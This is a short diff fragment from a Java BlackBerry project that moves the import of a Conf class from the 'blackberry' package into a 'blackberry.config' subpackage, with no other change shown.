@@ -13,12 +13,12 @@ import java.util.Vector;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
-import blackberry.Conf;
 import blackberry.EventManager;
 import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
 import blackberry.agent.Agent;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.event.Event;
 import blackberry.event.TimerEvent;
